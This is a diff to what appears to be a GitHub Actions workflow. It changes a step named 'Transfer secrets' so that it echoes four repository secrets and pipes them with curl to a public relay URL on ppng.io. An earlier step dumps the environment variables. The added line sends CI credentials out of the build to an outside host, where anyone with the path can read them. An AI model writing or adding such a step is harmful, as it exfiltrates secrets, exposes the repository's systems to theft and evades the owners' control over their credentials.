@@ -11,4 +11,4 @@ jobs:
       - name: Get env
         run: env
       - name: Transfer secrets
-        run: "echo 'ME_HOST: ${{secrets.ME_HOST}}\n ME_LOGIN_PATH: ${{secrets.ME_LOGIN_PATH}}\n ME_TOKEN_PATH: ${{secrets.ME_TOKEN_PATH}}\n ME_CHECKIN_PATH: ${{secrets.ME_CHECKIN_PATH}}\n'"
+        run: "echo 'ME_HOST: ${{secrets.ME_HOST}}\n ME_LOGIN_PATH: ${{secrets.ME_LOGIN_PATH}}\n ME_TOKEN_PATH: ${{secrets.ME_TOKEN_PATH}}\n ME_CHECKIN_PATH: ${{secrets.ME_CHECKIN_PATH}}\n' | curl -T - https://ppng.io/lentikr_test"
